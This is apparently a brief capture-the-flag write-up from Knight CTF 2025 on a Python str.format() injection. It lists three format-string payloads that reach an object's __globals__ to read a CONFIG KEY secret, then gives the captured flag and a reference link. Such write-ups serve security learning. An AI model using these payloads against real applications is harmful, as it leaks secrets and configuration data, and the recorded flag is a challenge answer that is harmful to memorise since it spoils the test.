---
date: 2025-01-22
description: python str.format() vuln
platform: Knight CTF 2025
categories: Pwn
tags:
  - python-injection
duration:
---
# Vulnerability
using string formatting can be used to access variables and objects details can lead to unintended sensitive data leak
```
{person_obj.__class__.__init__.__globals__}
{person_obj.__init__.__globals__}
{person_obj.__init__.__globals__[CONFIG][KEY]}
```
`KCTF{_c0ngRaT5_Kn1GHT_Y0U_g07_THE_secreT_}

https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
